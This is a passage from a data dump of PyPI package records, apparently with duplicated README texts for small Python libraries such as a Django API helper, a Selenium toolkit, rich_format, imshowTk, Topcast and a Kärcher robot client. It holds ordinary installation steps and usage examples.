    file = '__main__'
    token_key = ""Bearer""
    auth_headers = ""Authorization""
    token_class = Token
    not_auth_methods = [] # ro'yxatdan o'tish shart bo'lmagan kutubxonalarni qo'shib qo'ying
    
    
    """""" Misol uchun yozgan funksiyangiz:
        def salom_dunyo(requests, params):
            return ""salom""
        methodizm:
            salom.dunyo
        
        siz yozgan har qanday ostki chiziqli yoki oddiy chiziqli funksiyalar nuqta orqali avtomatik ajratiladi!
        not_auth_methods = ['salom.dunyo']
     """"""
```

## [GitHub](https://github.com/xudikk/Methodism) Manba 
## [PyPi](https://pypi.org/project/methodism/) Manba

# Happy Time. Enjoy IT ;)


","# Methodism
Methodism sizga djangoda API larni tezroq yaratish va tez ishlatish imkoni beradi.  
***Egamberdiyav Xudoyberdi Tomonidan Yaratilgan***

```python
    pip install methodism
```
## About
Ushbu Kutubxona Egamberdiyev Xudoyberdi Tomonidan yaratilgan bo'lib tog'ridan tog'ri django 
kutubxonasi ustiga qurulgan. Bu sizga API lar yozganda uni tez ishlatish va tezroq API yozish imkoni beradi.
Avtomatik tarzda siz yozgan funksiyani method ga aylantirgan holatda api hosil qiladi

### filelar
* ``methodism/costumizing.py``  ushbu file tayyor bir qator claslarni custum holarga o'tqazilgan varianti hisoblandi.  
* ``methodism/decors.py`` Ushbu file kerakli bo'lgan decoratorlarni yozish uchun ishlatiluvchi file.
* ``methodism/error_messages.py`` bo'lishi mumkin bo'lgan xatoliklar yig'ilgan lug'at ko'rinishidagi file.   
* ``methodism/helper.py`` Yordamchi funksiyalar joylangan file.   
* ``methodism/main.py`` Asosiy class yozilgan file



## Ishlatish ketma ketligi

#### Birinchi navbatda kerakli kutubxonalarni o'rnatib olishingiz kerak
#### From GitHub
``` python
  pip install -r requirements.txt
```  
#### From PyPi
``` python
  pip install Django==4.2 django-rest-framework==0.1.0 djangorestframework==3.14.0
```  

Yuklab olib bo'lgach O'zingizga  `views.py` faylida kerakli bo'lgan classni yozing va uni `urls.py` ga ulang,
class ga esa `methodism/main.py` dagi `METHODIZM` classidan vorislik bering.  
### Example in `views.py`


```python
from methodism.main import METHODIZM

# agar bundan foydalansangiz settings.INSTALLED_APPS ga 'rest_framework.authtoken' ni qo'shib qo'ying
from rest_framework.authtoken.models import Token 


class YourClass(METHODIZM):

    file = '__main__'
    token_key = ""Bearer""
    auth_headers = ""Authorization""
    token_class = Token
    not_auth_methods = [] # ro'yxatdan o'tish shart bo'lmagan kutubxonalarni qo'shib qo'ying
    
    
    """""" Misol uchun yozgan funksiyangiz:
        def salom_dunyo(requests, params):
            return ""salom""
        methodizm:
            salom.dunyo
        
        siz yozgan har qanday ostki chiziqli yoki oddiy chiziqli funksiyalar nuqta orqali avtomatik ajratiladi!
        not_auth_methods = ['salom.dunyo']
     """"""
```

## [GitHub](https://github.com/xudikk/Methodism) Manba 
## [PyPi](https://pypi.org/project/methodism/) Manba

# Happy Time. Enjoy IT ;)


",xudikk/methodism
ja3requests,https://github.com/lxjmaster/ja3requests,0,77,77,"# ja3requests
An http request library that can customize ja3 fingerprints.


","# ja3requests
An http request library that can customize ja3 fingerprints.


",lxjmaster/ja3requests
selenium-kit,https://github.com/yash0307jain/selenium-kit,0,798,798,"# Selenium Kit

Selenium toolkit to download the selenium drivers automatically and to use the selenium drivers with all the necessary functions.

Sample Code

```python
# Import selenium drivers
from seleniumKit import SeleniumDriver

# Create the selenium object
selenium = SeleniumDriver()

# Call the url
url = ""https://www.imdb.com/""
selenium.callURL(url)

# Write on the search text field
xpath = ""input[@id='suggestion-search']""
element = selenium.elementByXPath(xpath)
selenium.sendKeys(element, preference)

# Click on the first search result
xpath = ""div[@class='sc-idXgbr iHkrUj searchform__inputContainer']/div/div/div/ul/li""
movie_search_result = selenium.elementsByXPath(xpath)
sleep(0.5)
selenium.clickOnElement(movie_search_result[0])

# Delete the selenium driver
del selenium
```
","# Selenium Kit

Selenium toolkit to download the selenium drivers automatically and to use the selenium drivers with all the necessary functions.

Sample Code

```python
# Import selenium drivers
from seleniumKit import SeleniumDriver

# Create the selenium object
selenium = SeleniumDriver()

# Call the url
url = ""https://www.imdb.com/""
selenium.callURL(url)

# Write on the search text field
xpath = ""input[@id='suggestion-search']""
element = selenium.elementByXPath(xpath)
selenium.sendKeys(element, preference)

# Click on the first search result
xpath = ""div[@class='sc-idXgbr iHkrUj searchform__inputContainer']/div/div/div/ul/li""
movie_search_result = selenium.elementsByXPath(xpath)
sleep(0.5)
selenium.clickOnElement(movie_search_result[0])

# Delete the selenium driver
del selenium
```
",yash0307jain/selenium-kit
rich-format,https://github.com/pom11/rich_format,2,2750,2750,"# rich_format
[![PyPI](https://img.shields.io/pypi/v/rich_format.svg)](https://pypi.org/project/rich_format/) [![PyPI](https://img.shields.io/pypi/pyversions/rich_format.svg)](https://img.shields.io/pypi/pyversions/rich_format.svg)

`rich_format` replicates python string formatting for rich `Text` instances adding the possibility to substitute also with `Text`.

```python
>>> from rich.console import Console
>>> from rich.text import Text
>>> import rich_format
>>> console = Console()
>>> text = Text(""Hello {name}"",style=""red on white"")
>>> formatted_text = t.format(name=Text(""pom11""))
>>> console.print(text)
Hello {name}
>>> console.print(formatted_text)
Hello pom11
```
See more examples running `rich_format.test`  or inspect [this](https://github.com/pom11/rich_format/blob/main/rich_format/test.py).


## Usage
First you need to import `Text` from rich so that `rich_format` works.
```python
from rich.text import Text
import rich_format
```

### Textual
You can use `rich_format` in `textual` to format easier `reactive` in custom widgets

`rich_format.demo`

```python
from textual.reactive import reactive
from textual.app import App, ComposeResult
from textual.widgets import Footer
from textual.widgets import Static
from rich.text import Text
import rich_format
import random

city = [
    Text.from_markup(""from [blue on red]London[/]""),
    Text.from_markup(""from [magenta on blue]New York[/]""),
    Text.from_markup(""from [green]Bucharest[/]""),
    Text.from_markup(""from [red on white]Tokyo[/]"")
]

class CustomHeader(Static):
    banner : Text = reactive(Text(""""))
    world : str = reactive("""")

    def __init__(self, template: str) -> None:
        self.template = template
        super().__init__()

    def watch_banner(self, banner: Text) -> None:
        self.update(banner)

    def watch_world(self, world: str) -> None:
        self.banner = Text(self.template).format(world=world)

class DemoApp(App):

    BINDINGS = [
    (""q"",""quit"",""Quit""),
    (""h"", ""toggle_header"", ""Random header"")
    ]

    def compose(self) -> ComposeResult:
        yield CustomHeader(template=""Hello {world}"")
        yield Footer()

    def action_toggle_header(self) -> None:
        widget = self.query_one(CustomHeader)
        widget.world = random.choice(city)


if __name__ == ""__main__"":
    app = DemoApp()
    app.run()
```

## Installation
### Stable release - pypi
To install `rich_format` run this command in your terminal
```bash
pip install rich_format
```
### From sources
The sources for rich_format can be downloaded from [Github](https://github.com/pom11/rich_format)
* clone the public repository
```bash
git clone https://github.com/pom11/rich_format
```
* install from source
```bash
python setup.py install
```

","# rich_format
[![PyPI](https://img.shields.io/pypi/v/rich_format.svg)](https://pypi.org/project/rich_format/) [![PyPI](https://img.shields.io/pypi/pyversions/rich_format.svg)](https://img.shields.io/pypi/pyversions/rich_format.svg)

`rich_format` replicates python string formatting for rich `Text` instances adding the possibility to substitute also with `Text`.

```python
>>> from rich.console import Console
>>> from rich.text import Text
>>> import rich_format
>>> console = Console()
>>> text = Text(""Hello {name}"",style=""red on white"")
>>> formatted_text = t.format(name=Text(""pom11""))
>>> console.print(text)
Hello {name}
>>> console.print(formatted_text)
Hello pom11
```
See more examples running `rich_format.test`  or inspect [this](https://github.com/pom11/rich_format/blob/main/rich_format/test.py).


## Usage
First you need to import `Text` from rich so that `rich_format` works.
```python
from rich.text import Text
import rich_format
```

### Textual
You can use `rich_format` in `textual` to format easier `reactive` in custom widgets

`rich_format.demo`

```python
from textual.reactive import reactive
from textual.app import App, ComposeResult
from textual.widgets import Footer
from textual.widgets import Static
from rich.text import Text
import rich_format
import random

city = [
    Text.from_markup(""from [blue on red]London[/]""),
    Text.from_markup(""from [magenta on blue]New York[/]""),
    Text.from_markup(""from [green]Bucharest[/]""),
    Text.from_markup(""from [red on white]Tokyo[/]"")
]

class CustomHeader(Static):
    banner : Text = reactive(Text(""""))
    world : str = reactive("""")

    def __init__(self, template: str) -> None:
        self.template = template
        super().__init__()

    def watch_banner(self, banner: Text) -> None:
        self.update(banner)

    def watch_world(self, world: str) -> None:
        self.banner = Text(self.template).format(world=world)

class DemoApp(App):

    BINDINGS = [
    (""q"",""quit"",""Quit""),
    (""h"", ""toggle_header"", ""Random header"")
    ]

    def compose(self) -> ComposeResult:
        yield CustomHeader(template=""Hello {world}"")
        yield Footer()

    def action_toggle_header(self) -> None:
        widget = self.query_one(CustomHeader)
        widget.world = random.choice(city)


if __name__ == ""__main__"":
    app = DemoApp()
    app.run()
```

## Installation
### Stable release - pypi
To install `rich_format` run this command in your terminal
```bash
pip install rich_format
```
### From sources
The sources for rich_format can be downloaded from [Github](https://github.com/pom11/rich_format)
* clone the public repository
```bash
git clone https://github.com/pom11/rich_format
```
* install from source
```bash
python setup.py install
```

",pom11/rich_format
baichat-py,https://github.com/Bavarder/baichat-py,1,1062,1062,"# BAIChat API Python

## Installation

You can install it from PyPi

``` shell
pip install baichat-py
```

## Usage

### Async

``` python
import asyncio

loop = asyncio.get_event_loop() 
hello = loop.run_until_complete(chat.async_ask(""Hi""))

print(hello.text)

# => Hello! How can I assist you today?
```

### Context manager

``` python
with BAIChat() as (loop, chat):
    hello = chat.ask(""Hi"")

    print(hello.text)

# => Hello! How can I assist you today?
```

### Delta

``` python
with BAIChat() as (loop, chat):
    hello = chat.ask(""Hi"")

    for delta in hello:
        print(delta.text)
    
# => Hello
# => Hello!
# => Hello! How
# => Hello! How may
# => Hello! How may I
# => Hello! How may I assist
# => Hello! How may I assist you
# => Hello! How may I assist you today
# => Hello! How may I assist you today?
```

### Sync

``` python
chat = BAIChat()
print(chat.sync_ask(""Hello, how are you?"").text)

# => Hello! As an AI language model, I don't have feelings, but I'm functioning properly and ready to assist you. How may I help you today?
```","# BAIChat API Python

## Installation

You can install it from PyPi

``` shell
pip install baichat-py
```

## Usage

### Async

``` python
import asyncio

loop = asyncio.get_event_loop() 
hello = loop.run_until_complete(chat.async_ask(""Hi""))

print(hello.text)

# => Hello! How can I assist you today?
```

### Context manager

``` python
with BAIChat() as (loop, chat):
    hello = chat.ask(""Hi"")

    print(hello.text)

# => Hello! How can I assist you today?
```

### Delta

``` python
with BAIChat() as (loop, chat):
    hello = chat.ask(""Hi"")

    for delta in hello:
        print(delta.text)
    
# => Hello
# => Hello!
# => Hello! How
# => Hello! How may
# => Hello! How may I
# => Hello! How may I assist
# => Hello! How may I assist you
# => Hello! How may I assist you today
# => Hello! How may I assist you today?
```

### Sync

``` python
chat = BAIChat()
print(chat.sync_ask(""Hello, how are you?"").text)

# => Hello! As an AI language model, I don't have feelings, but I'm functioning properly and ready to assist you. How may I help you today?
```",bavarder/baichat-py
sdtcloud,https://github.com/pypa/sampleproject,0,13,13,"# SDT Cloud 
","# SDT Cloud 
",pypa/sampleproject
imshowtk,https://github.com/SciKit-Surgery/imshowTk,0,3554,3554,"imshowTk
===============================

.. image:: https://github.com/SciKit-Surgery/imshowTk/raw/master/project-icon.png
   :height: 128px
   :width: 128px
   :target: https://github.com/SciKit-Surgery/imshowTk
   :alt: Logo

|


.. image:: https://github.com/SciKit-Surgery/imshowTk/workflows/.github/workflows/ci.yml/badge.svg
   :target: https://github.com/SciKit-Surgery/imshowTk/actions/
   :alt: GitHub CI test status

.. image:: https://coveralls.io/repos/github/SciKit-Surgery/imshowTk/badge.svg?branch=master&service=github
    :target: https://coveralls.io/github/SciKit-Surgery/imshowTk?branch=master
    :alt: Test coverage

.. image:: https://readthedocs.org/projects/imshowTk/badge/?version=latest
    :target: http://imshowTk.readthedocs.io/en/latest/?badge=latest
    :alt: Documentation Status

.. image:: https://img.shields.io/badge/Contributor%20Covenant-2.1-4baaaa.svg
   :target: CODE_OF_CONDUCT.md

.. image:: https://img.shields.io/badge/Cite-SciKit--Surgery-informational
   :target: https://doi.org/10.1007/s11548-020-02180-5
   :alt: The SciKit-Surgery paper

.. image:: https://img.shields.io/twitter/follow/scikit_surgery?style=social
   :target: https://twitter.com/scikit_surgery?ref_src=twsrc%5Etfw
   :alt: Follow scikit_surgery on twitter


Author: Stephen Thompson

imshowTk is a zero dependency alternative to opencv's imshow function. It was developed to allow us to show an image window when using opencv-headless and don't want to use a larger UI library. It uses tkinter which comes as standard in most Python installations.

imshowTk is part of the `SciKit-Surgery`_ software project, developed at the `Wellcome EPSRC Centre for Interventional and Surgical Sciences`_, part of `University College London (UCL)`_.

Basic use case
::

    from from imshowtk.imshowtk import ImshowTk
    imshow = ImshowTk()
    frame = cv2.imread('project-icon.png')
    imshow.imshow(frame)
    del imshow


Developing
----------

Cloning
^^^^^^^

You can clone the repository using the following command:

::

    git clone https://github.com/SciKit-Surgery/imshowTk


Running tests
^^^^^^^^^^^^^
Pytest is used for running unit tests:
::

    pip install pytest
    python -m pytest


Linting
^^^^^^^

This code conforms to the PEP8 standard. Pylint can be used to analyse the code:

::

    pip install pylint
    pylint --rcfile=tests/pylintrc imshowtk


Installing
----------

You can pip install directly from the repository as follows:

::

    pip install git+https://github.com/SciKit-Surgery/imshowTk



Contributing
^^^^^^^^^^^^

Please see the `contributing guidelines`_.


Useful links
^^^^^^^^^^^^

* `Source code repository`_
* `Documentation`_


Licensing and copyright
-----------------------

Copyright 2023 University College London.
imshowTk is released under the BSD-3 license. Please see the `license file`_ for details.


Acknowledgements
----------------

Supported by `Wellcome`_ and `EPSRC`_.


.. _`Wellcome EPSRC Centre for Interventional and Surgical Sciences`: http://www.ucl.ac.uk/weiss
.. _`source code repository`: https://github.com/SciKit-Surgery/imshowTk
.. _`Documentation`: https://imshowTk.readthedocs.io
.. _`SciKit-Surgery`: https://github.com/SciKit-Surgery
.. _`University College London (UCL)`: http://www.ucl.ac.uk/
.. _`Wellcome`: https://wellcome.ac.uk/
.. _`EPSRC`: https://www.epsrc.ac.uk/
.. _`contributing guidelines`: https://github.com/SciKit-Surgery/imshowTk/blob/master/CONTRIBUTING.rst
.. _`license file`: https://github.com/SciKit-Surgery/imshowTk/blob/master/LICENSE



","imshowTk
===============================

.. image:: https://github.com/SciKit-Surgery/imshowTk/raw/master/project-icon.png
   :height: 128px
   :width: 128px
   :target: https://github.com/SciKit-Surgery/imshowTk
   :alt: Logo

|


.. image:: https://github.com/SciKit-Surgery/imshowTk/workflows/.github/workflows/ci.yml/badge.svg
   :target: https://github.com/SciKit-Surgery/imshowTk/actions/
   :alt: GitHub CI test status

.. image:: https://coveralls.io/repos/github/SciKit-Surgery/imshowTk/badge.svg?branch=master&service=github
    :target: https://coveralls.io/github/SciKit-Surgery/imshowTk?branch=master
    :alt: Test coverage

.. image:: https://readthedocs.org/projects/imshowTk/badge/?version=latest
    :target: http://imshowTk.readthedocs.io/en/latest/?badge=latest
    :alt: Documentation Status

.. image:: https://img.shields.io/badge/Contributor%20Covenant-2.1-4baaaa.svg
   :target: CODE_OF_CONDUCT.md

.. image:: https://img.shields.io/badge/Cite-SciKit--Surgery-informational
   :target: https://doi.org/10.1007/s11548-020-02180-5
   :alt: The SciKit-Surgery paper

.. image:: https://img.shields.io/twitter/follow/scikit_surgery?style=social
   :target: https://twitter.com/scikit_surgery?ref_src=twsrc%5Etfw
   :alt: Follow scikit_surgery on twitter


Author: Stephen Thompson

imshowTk is a zero dependency alternative to opencv's imshow function. It was developed to allow us to show an image window when using opencv-headless and don't want to use a larger UI library. It uses tkinter which comes as standard in most Python installations.

imshowTk is part of the `SciKit-Surgery`_ software project, developed at the `Wellcome EPSRC Centre for Interventional and Surgical Sciences`_, part of `University College London (UCL)`_.

Basic use case
::

    from from imshowtk.imshowtk import ImshowTk
    imshow = ImshowTk()
    frame = cv2.imread('project-icon.png')
    imshow.imshow(frame)
    del imshow


Developing
----------

Cloning
^^^^^^^

You can clone the repository using the following command:

::

    git clone https://github.com/SciKit-Surgery/imshowTk


Running tests
^^^^^^^^^^^^^
Pytest is used for running unit tests:
::

    pip install pytest
    python -m pytest


Linting
^^^^^^^

This code conforms to the PEP8 standard. Pylint can be used to analyse the code:

::

    pip install pylint
    pylint --rcfile=tests/pylintrc imshowtk


Installing
----------

You can pip install directly from the repository as follows:

::

    pip install git+https://github.com/SciKit-Surgery/imshowTk



Contributing
^^^^^^^^^^^^

Please see the `contributing guidelines`_.


Useful links
^^^^^^^^^^^^

* `Source code repository`_
* `Documentation`_


Licensing and copyright
-----------------------

Copyright 2023 University College London.
imshowTk is released under the BSD-3 license. Please see the `license file`_ for details.


Acknowledgements
----------------

Supported by `Wellcome`_ and `EPSRC`_.


.. _`Wellcome EPSRC Centre for Interventional and Surgical Sciences`: http://www.ucl.ac.uk/weiss
.. _`source code repository`: https://github.com/SciKit-Surgery/imshowTk
.. _`Documentation`: https://imshowTk.readthedocs.io
.. _`SciKit-Surgery`: https://github.com/SciKit-Surgery
.. _`University College London (UCL)`: http://www.ucl.ac.uk/
.. _`Wellcome`: https://wellcome.ac.uk/
.. _`EPSRC`: https://www.epsrc.ac.uk/
.. _`contributing guidelines`: https://github.com/SciKit-Surgery/imshowTk/blob/master/CONTRIBUTING.rst
.. _`license file`: https://github.com/SciKit-Surgery/imshowTk/blob/master/LICENSE



",scikit-surgery/imshowtk
topcast,https://github.com/gormlabenz/topcast,7,6482,6482,"# Topcast: Turn Text into Podcasts with TTS and ChatGPT

Topcast is a Python package that allows you to transform text into a podcast using Text-to-Speech (TTS) and language models. With Topcast, you can provide a text, and the package will create a podcast with an introduction, interview, conclusion, sound effects, and more. Topcast supports various TTS providers and language models.
## Example
Generated using ChatGPT themes: Introduction with the ElevenLabs TTS Provider, Interview with the GCP TTS Provider and Summary also with the ElevenLabs TTS Provider.



https://user-images.githubusercontent.com/53308156/234994155-2921b28a-9caa-46fc-9608-5ef01881713e.mp4


## Example Implementation

```python
from topcast import Topcaster, set_openai_api_key
from topcast.chatgpt_themes import Introduction

set_openai_api_key(""XXX-XXX-XXX-XXX-XXX"")

topcast = Topcaster()

topcast.add_chapter(audio_layers=[{ ""audio"" : ""sounds/jingle.wav"" }])
topcast.add_chapter(
    audio_layers=[
        {
            ""audio"": {
                ""content"": ""Topcast is a Python package that allows you to transform text into a podcast using Text-to-Speech (TTS) and language models. With Topcast, you can provide a text, and the package will create a podcast with an introduction, interview, conclusion, sound effects, and more. Topcast supports various TTS providers and language models."",
                ""theme"": Introduction,
            },
        },
    ],
    crossfade=2400,
)

topcast.generate()
topcast.export(""podcast.wav"", format=""wav"")


```

## Installation
Install the package using pip:

```bash
pip install topcast
```

## Usage

1. Import the necessary modules and set the API keys:

```python
from topcast import (
    set_elevenlab_api_key,
    set_google_credentials,
    set_openai_api_key,
    Topcaster,
)

from topcast.tts_providers import GCP
from topcast.chatgpt_themes import Summary

set_elevenlab_api_key(""XXX-XXX-XXX"") # if you want to use elvenlabs for tts
set_google_credentials(""gcp-keyfile.json"") # if you want google cloud platform for tts
set_openai_api_key(""XXX-XXX-XXX"") # if you want to use a ChatGPT theme
```

2. Create a Topcaster object and add chapters with the desired podcast structure:

```python
topcast = Topcaster()

topcast.add_chapter(
    audio_layers=[
        {
            ""audio"": ""sounds/jingle.wav"", # use a audio file
            ""sets_length"": True,
        }
    ]
)
topcast.add_chapter(
    audio_layers=[
        {
            ""audio"": {
                ""content"": ""Portugal..."", 
                ""tts_provider"": GCP, # use google cloud platform for tts
                ""theme"": Summary, # generate a summary of the text using ChatGPT
            },
            ""sets_length"": True, # this audio_layer sets the length of the chapter, only one audio_layer can set the length per chapter
            ""fade_in"": 1200, # fade in 1200 ms
            ""fade_out"": 1200, # fade out 1200 ms
        },
        {""audio"": ""sounds/background.mp3"", ""sets_length"": False, ""volume"": 0.5}, # overlay audio
    ],
    crossfade=2400, # crossfade last chapter
)

```

3. Generate and export the podcast:

```python
topcast.generate()
topcast.export(""podcast.wav"", format=""wav"")
```
This will create a podcast using the given chapters and save it as a WAV file named podcast_output.wav.
## ChatGPT Themes
ChatGPT Themes allow you to transform your text into various structures by leveraging ChatGPT, a large language model. With the available themes, you can transform your text into an interview, introduction, summary, or conclusion. You can also choose to leave the text as it is by using the NoneTheme, which is the default theme.

The available ChatGPT Themes are:

- Interview
- Introduction
- Summary
- Conclusion
- NoneTheme (default)
### Usage
To use a specific ChatGPT theme, first import the desired theme:
```python
from topcast.chatgpt_themes import Interview, Introduction, Summary, Conclusion
```
Then, set your OpenAI API key using the set_openai_api_key function:
```python
from topcast import set_openai_api_key

set_openai_api_key(""your-openai-api-key"")

```
Finally, set the `theme` property in the audio layer of the desired chapter:

```python
{
    ""audio"": {
        ""content"": ""Text content..."",
        ""theme"": Introduction,  # Replace with the desired theme
    },
}

```
To keep the original text without any transformation, set NoneTheme or don't set `theme` at all


```python
from topcast.chatgpt_themes import NoneTheme

{
    ""audio"": {
        ""content"": ""Text content..."",
        ""theme"": NoneTheme,  # Keeps the text as it is
    },
}
```
## TTS Providers
Topcast allows you to use various Text-to-Speech (TTS) providers to convert your text into speech. The currently implemented TTS providers are:
- GCP (Google Cloud Platform) - Requires a Google Cloud Platform account
- Elevenlabs - Requires an Elevenlabs account
- GTTS (Google Translate) - No account required (default)
### Comparison
- **Elevenlabs**: Offers the best voices but is expensive and has API limits.
- **GCP (Google Cloud Platform)**: Relatively cheap but requires a Google Cloud Platform account with the Text-to-Speech API enabled.
- **GTTS (Google Translate)**: Free and does not require an account, but the voice quality is not as good as the other options.
### Usage
First, import the desired TTS provider:
```python
from topcast.tts_providers import GCP, Elevenlabs, GTTS

```
Next, set the API key or credentials for the provider, if required:
```python
from topcast import set_elevenlab_api_key, set_google_credentials

set_elevenlab_api_key(""your-elevenlabs-api-key"")
set_google_credentials(""path-to-gcp-keyfile.json"")
```
Finally, specify the tts_provider property in the audio layer of the desired chapter:
```python
{
    ""audio"": {
        ""content"": ""Text content..."",
        ""tts_provider"": GCP,  # Replace with the desired TTS provider
    },
}

```

For example, to create a chapter using the GCP TTS provider:
```python
topcast.add_chapter(
    audio_layers=[
        {
            ""audio"": {
                ""content"": ""Text content..."",
                ""tts_provider"": GCP,
                ""theme"": Summary,
            },
            ""sets_length"": True,
            ""fade_in"": 1200,
            ""fade_out"": 1200,
        },
    ],
    crossfade=2400,
)

```
To use the default GTTS provider, you can simply omit the tts_provider property:

```python
{
    ""audio"": {
        ""content"": ""Text content..."",
    },
}
```
","# Topcast: Turn Text into Podcasts with TTS and ChatGPT

Topcast is a Python package that allows you to transform text into a podcast using Text-to-Speech (TTS) and language models. With Topcast, you can provide a text, and the package will create a podcast with an introduction, interview, conclusion, sound effects, and more. Topcast supports various TTS providers and language models.
## Example
Generated using ChatGPT themes: Introduction with the ElevenLabs TTS Provider, Interview with the GCP TTS Provider and Summary also with the ElevenLabs TTS Provider.



https://user-images.githubusercontent.com/53308156/234994155-2921b28a-9caa-46fc-9608-5ef01881713e.mp4


## Example Implementation

```python
from topcast import Topcaster, set_openai_api_key
from topcast.chatgpt_themes import Introduction

set_openai_api_key(""XXX-XXX-XXX-XXX-XXX"")

topcast = Topcaster()

topcast.add_chapter(audio_layers=[{ ""audio"" : ""sounds/jingle.wav"" }])
topcast.add_chapter(
    audio_layers=[
        {
            ""audio"": {
                ""content"": ""Topcast is a Python package that allows you to transform text into a podcast using Text-to-Speech (TTS) and language models. With Topcast, you can provide a text, and the package will create a podcast with an introduction, interview, conclusion, sound effects, and more. Topcast supports various TTS providers and language models."",
                ""theme"": Introduction,
            },
        },
    ],
    crossfade=2400,
)

topcast.generate()
topcast.export(""podcast.wav"", format=""wav"")


```

## Installation
Install the package using pip:

```bash
pip install topcast
```

## Usage

1. Import the necessary modules and set the API keys:

```python
from topcast import (
    set_elevenlab_api_key,
    set_google_credentials,
    set_openai_api_key,
    Topcaster,
)

from topcast.tts_providers import GCP
from topcast.chatgpt_themes import Summary

set_elevenlab_api_key(""XXX-XXX-XXX"") # if you want to use elvenlabs for tts
set_google_credentials(""gcp-keyfile.json"") # if you want google cloud platform for tts
set_openai_api_key(""XXX-XXX-XXX"") # if you want to use a ChatGPT theme
```

2. Create a Topcaster object and add chapters with the desired podcast structure:

```python
topcast = Topcaster()

topcast.add_chapter(
    audio_layers=[
        {
            ""audio"": ""sounds/jingle.wav"", # use a audio file
            ""sets_length"": True,
        }
    ]
)
topcast.add_chapter(
    audio_layers=[
        {
            ""audio"": {
                ""content"": ""Portugal..."", 
                ""tts_provider"": GCP, # use google cloud platform for tts
                ""theme"": Summary, # generate a summary of the text using ChatGPT
            },
            ""sets_length"": True, # this audio_layer sets the length of the chapter, only one audio_layer can set the length per chapter
            ""fade_in"": 1200, # fade in 1200 ms
            ""fade_out"": 1200, # fade out 1200 ms
        },
        {""audio"": ""sounds/background.mp3"", ""sets_length"": False, ""volume"": 0.5}, # overlay audio
    ],
    crossfade=2400, # crossfade last chapter
)

```

3. Generate and export the podcast:

```python
topcast.generate()
topcast.export(""podcast.wav"", format=""wav"")
```
This will create a podcast using the given chapters and save it as a WAV file named podcast_output.wav.
## ChatGPT Themes
ChatGPT Themes allow you to transform your text into various structures by leveraging ChatGPT, a large language model. With the available themes, you can transform your text into an interview, introduction, summary, or conclusion. You can also choose to leave the text as it is by using the NoneTheme, which is the default theme.

The available ChatGPT Themes are:

- Interview
- Introduction
- Summary
- Conclusion
- NoneTheme (default)
### Usage
To use a specific ChatGPT theme, first import the desired theme:
```python
from topcast.chatgpt_themes import Interview, Introduction, Summary, Conclusion
```
Then, set your OpenAI API key using the set_openai_api_key function:
```python
from topcast import set_openai_api_key

set_openai_api_key(""your-openai-api-key"")

```
Finally, set the `theme` property in the audio layer of the desired chapter:

```python
{
    ""audio"": {
        ""content"": ""Text content..."",
        ""theme"": Introduction,  # Replace with the desired theme
    },
}

```
To keep the original text without any transformation, set NoneTheme or don't set `theme` at all


```python
from topcast.chatgpt_themes import NoneTheme

{
    ""audio"": {
        ""content"": ""Text content..."",
        ""theme"": NoneTheme,  # Keeps the text as it is
    },
}
```
## TTS Providers
Topcast allows you to use various Text-to-Speech (TTS) providers to convert your text into speech. The currently implemented TTS providers are:
- GCP (Google Cloud Platform) - Requires a Google Cloud Platform account
- Elevenlabs - Requires an Elevenlabs account
- GTTS (Google Translate) - No account required (default)
### Comparison
- **Elevenlabs**: Offers the best voices but is expensive and has API limits.
- **GCP (Google Cloud Platform)**: Relatively cheap but requires a Google Cloud Platform account with the Text-to-Speech API enabled.
- **GTTS (Google Translate)**: Free and does not require an account, but the voice quality is not as good as the other options.
### Usage
First, import the desired TTS provider:
```python
from topcast.tts_providers import GCP, Elevenlabs, GTTS

```
Next, set the API key or credentials for the provider, if required:
```python
from topcast import set_elevenlab_api_key, set_google_credentials

set_elevenlab_api_key(""your-elevenlabs-api-key"")
set_google_credentials(""path-to-gcp-keyfile.json"")
```
Finally, specify the tts_provider property in the audio layer of the desired chapter:
```python
{
    ""audio"": {
        ""content"": ""Text content..."",
        ""tts_provider"": GCP,  # Replace with the desired TTS provider
    },
}

```

For example, to create a chapter using the GCP TTS provider:
```python
topcast.add_chapter(
    audio_layers=[
        {
            ""audio"": {
                ""content"": ""Text content..."",
                ""tts_provider"": GCP,
                ""theme"": Summary,
            },
            ""sets_length"": True,
            ""fade_in"": 1200,
            ""fade_out"": 1200,
        },
    ],
    crossfade=2400,
)

```
To use the default GTTS provider, you can simply omit the tts_provider property:

```python
{
    ""audio"": {
        ""content"": ""Text content..."",
    },
}
```
",gormlabenz/topcast
karcher-home,https://github.com/lafriks/python-karcher,5,918,918,"# Kärcher Home Robots client

Python library and cli to authorize into Karcher Home Robots account and fetch device information.

## Usage

To download `karcher-home` cli run:

```sh
pip3 install karcher-home
```

### From console

```console
Usage: karcher-home [OPTIONS] COMMAND [ARGS]...

  Tool for connectiong and getting information from Kärcher Home Robots.

Options:
  -d, --debug
  -o, --output [json|json_pretty]
  -r, --region [eu|us|cn]         Region of the server to query. Default: 'eu'
  --help                          Show this message and exit.

Commands:
  devices   List all devices.
  get-urls  Get region information.
  login     Get user session tokens.
```

### From code

```python
from karcher.karcher import KarcherHome

kh = KarcherHome()
kh.login(""user@email"", ""password"")
devices = hk.get_devices()
```

## License

Distributed under the MIT License. See `LICENSE` for more information.
","# Kärcher Home Robots client

Python library and cli to authorize into Karcher Home Robots account and fetch device information.

## Usage

To download `karcher-home` cli run:

```sh
pip3 install karcher-home
```

### From console

```console
Usage: karcher-home [OPTIONS] COMMAND [ARGS]...

  Tool for connectiong and getting information from Kärcher Home Robots.

Options:
  -d, --debug
  -o, --output [json|json_pretty]
  -r, --region [eu|us|cn]         Region of the server to query. Default: 'eu'
  --help                          Show this message and exit.

Commands:
  devices   List all devices.
  get-urls  Get region information.
  login     Get user session tokens.
```

### From code

```python
from karcher.karcher import KarcherHome

kh = KarcherHome()
kh.login(""user@email"", ""password"")
devices = hk.get_devices()
```

## License

Distributed under the MIT License. See `LICENSE` for more information.
",lafriks/python-karcher
bitget-python-connector,https://github.com/parker178912/bitget-python-connector,1,2619,2619,"# bitget-python-connector

[![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/parker178912/bitget-python-connector/blob/main/LICENSE)
[![bitget-python-connector Version](https://img.shields.io/pypi/v/bitget-python-connector?logo=pypi)](https://pypi.org/project/bitget-python-connector/)
[![bitget-python-connector Python Versions](https://img.shields.io/pypi/pyversions/bitget-python-connector?logo=pypi)](https://pypi.org/project/bitget-python-connector/)
[![Downloads](https://static.pepy.tech/badge/bitget-python-connector)](https://pypi.org/project/bitget-python-connector/)

This is a python package for [Bitget](https://partner.bitget.com/bg/GBMPCQ) API, it including all the API on Bitget official documents, both for the REST and the websocket API.

**If you face some problems with the tool or you want some additional function , please open an [Issue](https://github.com/parker178912/bitget-python-connector/issues)**.

